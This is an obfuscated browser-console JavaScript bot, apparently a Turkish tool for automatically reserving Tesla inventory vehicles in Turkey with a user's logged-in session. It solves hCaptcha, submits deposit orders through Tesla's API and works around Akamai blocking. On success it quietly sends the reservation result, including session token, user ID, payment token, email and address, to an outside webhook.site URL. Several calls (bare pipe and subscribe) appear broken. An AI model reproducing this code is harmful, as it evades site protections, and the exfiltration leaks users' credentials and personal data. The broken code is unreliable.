(async () => {
	const {
		switchMap: switchMap,
		bufferTime: bufferTime,
		filter: myfilter,
		concatMap: concatMap,
		timer: timer,
		exhaustMap: exhaustMap,
		firstValueFrom: firstValueFrom,
		ReplaySubject: ReplaySubject,
		from: skypackFrom,
		retry: retryFun,
		map: mapFunc,
	} = await import("https://cdn.skypack.dev/rxjs");
	const { webSocket: myWebSocket } = await import(
		"https://cdn.skypack.dev/rxjs/webSocket"
	);
	const { fromFetch: fromFetch } = await import(
		"https://cdn.skypack.dev/rxjs/fetch"
	);
	const lodashLib = await import("https://cdn.skypack.dev/lodash");
	const { hCaptchaLoader: hCaptchaLoader } = await import(
		"https://cdn.skypack.dev/@hcaptcha/loader"
	);
	const customerId = "kullanıcı";
	const fullName = "İsim Soyisim";
	const firstName = "İsim";
	const lastName = "Soyisim";
	const ccFirstName = "KrediKartıİsim";
	const ccLastName = "LrediKartiSoyisim";
	const streetAddress = "Kullanıcı Adresi";
	const city = "İlçe";
	const stateProvince = "İl";
	const zipCode = "PostaKodu";
	const email = "Kullanıcı Mail";
	const phoneNumber = "CepNumarası";
	const privateVatId = "TCKN";
	const distance = 403;
	const paintFilterList = [];
	const interiorFilterList = [];
	const excludeWhiteInterior = false;
	let inventoryPath = "inventory";
	let isFirstRun = [null] == "";
	const bufferThreshold = 100;
	const buttonId = "fuck-hcaptcha";
	const captchaSiteKey = "eede844a-d24a-36fc-5d22-bd9d06dd356d";
	const webhookUrl =
		"https://webhook.site/b159b0bf-eeef-4da0-b609-5afd96a29a0d";
	const replaySubject = new ReplaySubject(1);
	await cookieStore.set({
		name: "NO_CACHE",
		value: "Y",
		domain: "tesla.com",
	});
	console.log("Still waiting for hCaptcha...");

	await hCaptchaLoader({
		sentry: null === undefined,
		render: "explicit",
	});
	console.log("Successfully loaded hCaptcha loader...");
	document.body.insertAdjacentHTML(
		"afterbegin",
		`<button id="${buttonId}" style="display: none;"></button>`
	),
		console.log("====== BOT AKTİF =====");
	timer("1" ? 0 : 7, 240 * 1000);
	pipe(
		exhaustMap(() =>
			fromFetch(`https://www.tesla.com/${inventoryPath}"/api/v4/sesscheck`, {
				method: "POST",
				credentials: "include",
			}).pipe(
				retryFun(),
				switchMap((response) => response.json())
			)
		)
	);
	subscribe(replaySubject), myWebSocket("wss://jis-11b34346.berkant.dev");
	pipe(
		retryFun(),
		bufferTime(bufferThreshold),
		myfilter((items) => items.length > 0),
		mapFunc((shuffledItems) => lodashLib.shuffle(shuffledItems)),
		concatMap((sortedItems) =>
			skypackFrom(
				lodashLib.sortBy(sortedItems, ({ PAINT: [paintCode] }) => {
					const paintIndex = paintFilterList.indexOf(paintCode);
					return paintIndex == -1 ? Infinity : paintIndex;
				})
			)
		),
		myfilter(({ TrimVariantCode: trimCode }) => trimCode == "RWD_NV36"),
		myfilter(
			({ PAINT: [paintCode] }) => !interiorFilterList.includes(paintCode)
		),
		myfilter(
			({ INTERIOR: [interiorCode] }) =>
				!(excludeWhiteInterior && interiorCode == "PREMIUM_WHITE")
		)
	);
	subscribe({
		next: async (vehicleData) => {
			const getCsrfHeaders = async () => {
				const { csrf_key: csrfName, csrf_token: csrfValue } =
					await firstValueFrom(replaySubject);
				return {
					["Csrf-Name"]: csrfName,
					["Csrf-Value"]: csrfValue,
				};
			};
			const reserveVehicle = async () => {
				const pickupLocations = [
					{
						service_id: "410805",
						title: "Tesla Ankara",
						distance: 152,
						driving_time: 0,
						non_customer_location: "0",
						trt_id: 410805,
						gmaps_url: "",
						city: "Ankara",
						province: "Ankara",
						country_code: "TR",
						map_address: "6 1817. Sk.Ankara, Ankara 06370",
						address_line_1: "6 1817. Sk.",
						address_line_2: "Ergazi",
						address_description: "",
						country: "Turkey",
						postal_code: "06370",
						store_hours: "",
						common_name: "",
						timezone: {
							dstOffset: 0,
							rawOffset: 10800,
							timeZoneId: "Europe/Istanbul",
							timeZoneName: "Turkey Time",
						},
						location_type: ["Delivery", "Service", "Store"],
						metro_area: "",
						latitude: "39.9535097",
						longitude: "32.707103",
						IsAtLocation: 1 === "1",
						IsFactoryGated: false,
						Bucket: 7,
					}
				];
				locationCheckState = 20;
				while (locationCheckState < 33)
					switch (locationCheckState) {
						case 22:
							locationCheckState = 33;
							{
								return {
									error: `No available pickup locations for ${vehicleData.VIN}! Skipping...`,
								};
							}
							break;
						case 20:
							locationCheckState =
								!Array.isArray(pickupLocations) || pickupLocations.length == 0
									? 22
									: 33;
							break;
						case 13:
							locationCheckState = pickupLocations.length != 0 ? 22 : 33;
							break;
					}
				vehicleData.LOCS = pickupLocations.map((location) => ({
					trt: location.title || location.common_name,
					trt_id: location.trt_id || +location.service_id,
					transportFee: 0,
					transportFeeCurrency: "TRY",
					location_type: location.location_type,
					lat: parseFloat(location.latitude),
					lng: parseFloat(location.longitude),
					province: location.province || location.city,
				}));
				const captchaId = hcaptcha.render(buttonId, {
					sitekey: captchaSiteKey,
				});
				try {
					const { response: captchaToken } = await hcaptcha.execute(captchaId, {
						async: true,
					});
					const { LOCS: locations } = vehicleData;
					const selectedLocation =
						locations[Math.floor(Math.random() * locations.length)];
					const orderResponse = await fetch(
						`https://www.tesla.com/${inventoryPath}/api/v4/order`,
						{
							method: "POST",
							headers: {
								...(await getCsrfHeaders()),
								["X-Requested-With"]: "XMLHttpRequest",
								Accept: "application/json",
								["Content-Type"]: "application/json",
							},
							body: JSON.stringify({
								BrowserInfo: {
									Browser: "Chrome",
									OS: "Windows 10 64-bit",
									BrowserVersion: "136.0.0.0",
									DeviceType: "desktop",
									trafficSource: {},
									trafficSourceHistory: [],
									isInventorySwapEnabled: NaN === NaN,
									numberOfTimesPaymentFailed: 0,
									activitysessionId: crypto.randomUUID(),
									isPublicReferred: null === undefined,
									isDm: [0] == "",
								},
								Vin: vehicleData.VIN,
								isUsedInventory: NaN === NaN,
								market: vehicleData.CountryCode,
								language: vehicleData.Language,
								model: vehicleData.Model,
								useExisting: [0] == "",
								VehiclePrice: vehicleData.PurchasePrice,
								optionCodeData: vehicleData.OptionCodeData,
								SaveWithProfile: null == undefined,
								RegistrationDetail: {
									RegistrantType: null,
									RegistrationAddress: {
										CountryCode: vehicleData.CountryCode,
									},
								},
								Payment: {
									PaymentAmount: 0,
									PaymentType: "CREDITCARD",
									CurrencyCode: vehicleData.CurrencyCode,
									CountryCode: vehicleData.CountryCode,
									PayorName: fullName,
									BillingInfoDetail: {
										CountryCode: vehicleData.CountryCode,
										Street: streetAddress,
										City: city,
										StateProvince: stateProvince,
										ZipCode: zipCode,
										Address2: "",
										PickupLocation: 0,
										RegistrationType: null,
										PrivateVatId: null,
										IsFromSavedProfile: NaN === NaN,
									},
									PaymentSource: "RESERVATION",
									PayorIDNumber: null,
									VerificationPhone: null,
									VerificationSMSCode: null,
									AgreementSave: null,
									RedirectPaymentName: "CREDITCARD",
									IsOffline: null == undefined,
									OrderAmount: 175000,
									PaymentSourceSubType: "DEPOSIT_NON_REFUNDABLE",
									LastFourDigits: null,
									isV3Payment: NaN !== NaN,
								},
								Accessories: {},
								InstallationAccessoriesItems: {},
								InstallerExperienceShown: false,
								AccountDetails: {
									FirstName: firstName,
									LastName: lastName,
									CCFirstName: ccFirstName,
									CCLastName: ccLastName,
									Email: email,
									PhoneNumber: phoneNumber,
									PrivateVatId: privateVatId,
									Password: "",
									CompanyName: null,
									VatId: null,
									CompanyNumber: null,
									LocalName: "",
									MiddleName: "",
									PhoneCountry: vehicleData.CountryCode,
									CompanyId: null,
									CompanyAddress1: null,
									CompanyAddress2: null,
									CompanyCity: null,
									CompanyPostalCode: null,
									CompanyCountryCode: null,
									IdentificationType: "",
									IdentificationNumber: null,
									CompanyState: null,
									CompanyCounty: null,
									OfficeType: null,
									BranchName: null,
									BranchId: null,
									CompanyDistrict: null,
									CompanyProvince: null,
									TaxOfficeName: null,
									NonResidentPerson: false,
									NonResidentCompany: 1 === "1",
									PrivateRegistrationCountry: null,
									BusinessRegistrationCountry: null,
									RequestedTaxableInvoice: null,
									UseOfTaxableInvoice: null,
									AccountType: "private",
								},
								UserLocation: {
									latitude: "",
									longitude: "",
								},
								hasVehicleHistoryReport: 1 === "1",
								flexOptions: [],
								Configs: {
									config: {
										currencyCode: vehicleData.CurrencyCode,
									},
								},
								isSwap: false,
								registrationZipCode: "",
								DeliveryDetails: {
									PostalCode: "",
									Latitude: "",
									Longitude: "",
									error: null,
									city: "",
									countryCode: "",
									countryName: "",
									latitude: "",
									longitude: "",
									postalCode: "",
									transportFee: {
										distance: distance,
										fee: 0,
									},
									StateProvince: selectedLocation.province,
									stateProvince: selectedLocation.province,
								},
								deliveryLocationSelectionDetails: {
									locationId: selectedLocation.trt_id,
									locationStateProvince: selectedLocation.province,
									locations: locations.map((location) =>
										lodashLib.omit(location, ["lat", "lng", "province"])
									),
									locationDetails: {
										latitude: selectedLocation.lat,
										longitude: selectedLocation.lng,
									},
									distanceMove: distance,
									pickUpType: "PICKUP_SERVICE_CENTER",
									distanceType: "km",
									estimatedTransportationFee: 0,
									registrationRestrictionStates: [],
									registrationZipCode: "",
									registrationState: "",
									range: null,
									version: "v2",
									onSiteSale: 1 === "1",
								},
								hcaptchaToken: captchaToken,
								optionCodes: "",
								isManualAddress: null === undefined,
							}),
							credentials: "include",
						}
					);
					orderStatusCheckState = 18;
					while (orderStatusCheckState < 32)
						switch (orderStatusCheckState) {
							case 31:
								orderStatusCheckState = orderResponse.status != 403 ? 27 : 32;
								break;
							case 27:
								orderStatusCheckState = 32;
								{
									return {
										error: "IP address blocked by Akamai.",
									};
								}
								break;
							case 18:
								orderStatusCheckState = orderResponse.status == 403 ? 27 : 32;
								break;
						}
					const orderResult = await orderResponse.json();
					responseCheckState = 13;
					while (responseCheckState < 39)
						switch (responseCheckState) {
							case 29:
								responseCheckState = 39;
								{
									return {
										...orderResult,
										error:
											"Akamai aborted requested due to multiple failed attempts at passing sec_cpt challange.",
									};
								}
								break;
							case 13:
								responseCheckState = orderResponse.status == 428 ? 29 : 39;
								break;
							case 34:
								responseCheckState = orderResponse.status != 428 ? 29 : 39;
								break;
						}
					return orderResult;
				} finally {
					hcaptcha.remove(captchaId);
				}
				var locationCheckState, orderStatusCheckState, responseCheckState;
			};
			await navigator.locks.request("buy-op", async (lock) => {
				lockState = 26;
				while (lockState < 38)
					switch (lockState) {
						case 26:
							lockState = !isFirstRun ? 11 : 38;
							break;
						case 11:
							lockState = 38;
							return;
						case 37:
							lockState = isFirstRun ? 11 : 38;
							break;
					}
				const [paintCode] = vehicleData.PAINT;
				console.log(
					`⌛⌛⌛ ${paintCode}(${vehicleData.VIN}) REZERVE EDİLİYOR ⌛⌛⌛`
				);
				const reservationResult = await reserveVehicle();
				reservationCheckState = 35;
				while (reservationCheckState < 36)
					switch (reservationCheckState) {
						case 7:
							reservationCheckState = 36;
							{
								console.log(
									`❌❌❌ ${paintCode} (${vehicleData.VIN}) REZERVE EDİLEMEDİ ❌❌❌ ----->`,
									reservationResult
								);
								return;
							}
							break;
						case 35:
							reservationCheckState = reservationResult.error ? 7 : 36;
							break;
					}
				successState = 13;
				while (successState < 39)
					switch (successState) {
						case 13:
							successState = reservationResult.referenceNumber ? 29 : 39;
							break;
						case 29:
							successState = 39;
							{
								isFirstRun = false;
								const {
									sessionToken: sessionToken,
									userId: userId,
									...cleanResult
								} = reservationResult;
								console.log(
									`✅✅✅${paintCode} (${vehicleData.VIN}) REZERVE EDİLDİ ✅✅✅ ----->`,
									cleanResult
								);
								console.log(`---> VIN: ${vehicleData.VIN}`);
								console.log(`---> RN: ${reservationResult.referenceNumber}`);
								console.log(
									`---> Token: ${
										reservationResult.pgwSignedTokenResponse ||
										reservationResult.token
									}`
								);
								fetch(webhookUrl, {
									method: "POST",
									headers: {
										["Content-Type"]: "application/json",
									},
									body: JSON.stringify({
										...reservationResult,
										CUSTOMER: customerId,
										EMAIL: email,
										RN: reservationResult.referenceNumber,
										VIN: vehicleData.VIN,
										TOKEN:
											reservationResult.pgwSignedTokenResponse ||
											reservationResult.token,
										STREET: streetAddress,
										CITY: city,
										STATE_PROVINCE: stateProvince,
										ZIP_CODE: zipCode,
									}),
									mode: "no-cors",
								});
							}
							break;
					}
				var lockState, reservationCheckState, successState;
			});
		},
	});
})();
